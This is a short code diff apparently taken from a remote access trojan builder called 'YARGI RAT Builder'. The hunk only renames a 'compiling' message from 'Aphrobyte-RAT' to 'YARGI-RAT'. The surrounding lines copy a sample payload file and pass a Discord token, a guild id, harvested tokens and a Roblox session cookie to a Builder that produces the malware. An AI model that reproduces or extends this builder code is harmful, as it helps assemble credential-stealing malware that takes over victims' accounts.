@@ -103,7 +103,7 @@ elif prompt.lower() == "n":
 os.system("""title "YARGI RAT Builder | Compiling | Unlicensed"
 """)
 clear()
-print(colored("Started compiling Aphrobyte-RAT configuration...", 'green'))
+print(colored("Started compiling YARGI-RAT configuration...", 'green'))
 shutil.copy(samplefile, "build\main.py")
 builder = Builder(token=token,guild_id=guildid,announc=annc,passw=passw,tokens=tokens,roblosec=roblosecurity)
 builder.build()
